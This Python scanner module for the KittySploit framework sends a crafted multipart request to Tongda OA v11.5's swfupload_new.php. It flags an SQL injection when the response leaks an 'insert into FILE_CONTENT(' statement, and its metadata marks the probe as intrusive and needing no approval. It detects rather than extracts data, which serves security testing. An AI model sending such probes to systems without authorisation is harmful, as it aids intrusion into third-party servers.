#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""There is a SQL injection vulnerability in the swfupload_new."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Tongda OA v11.5 swfupload_new.php - SQL Injection Detection',
        'description': 'There is a SQL injection vulnerability in the swfupload_new.php file of Tongda OA v11.5. An attacker can obtain sensitive information of the server through the vulnerability.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'tongda', 'sqli', 'intrusive', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'http://wiki.peiqi.tech/wiki/oa/通达OA/通达OA%20v11.5%20swfupload_new.php%20SQL注入漏洞.html',
            'https://github.com/zan8in/afrog/blob/main/v2/pocs/afrog-pocs/vulnerability/tongda-swfupload-new-sql-inject.yaml',
        ],
    }

    def run(self):
        path = '/general/file_folder/swfupload_new.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'multipart/form-data; boundary=----------GFioQpMK0vv2', 'Accept-Encoding': 'gzip'}, data='------------GFioQpMK0vv2\nContent-Disposition: form-data; name="ATTACHMENT_ID"\n\n1\n------------GFioQpMK0vv2\nContent-Disposition: form-data; name="ATTACHMENT_NAME"\n\n1\n------------GFioQpMK0vv2\nContent-Disposition: form-data; name="FILE_SORT"\n\n2\n------------GFioQpMK0vv2\nContent-Disposition: form-data; name="SORT_ID"\n\n------------GFioQpMK0vv2--\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('insert into FILE_CONTENT(',)
        if any(m in body for m in body_any):
            self.set_info(severity='high', reason='Tongda OA v11.5 swfupload_new.php - SQL Injection detected', path=path)
            return True
        return False

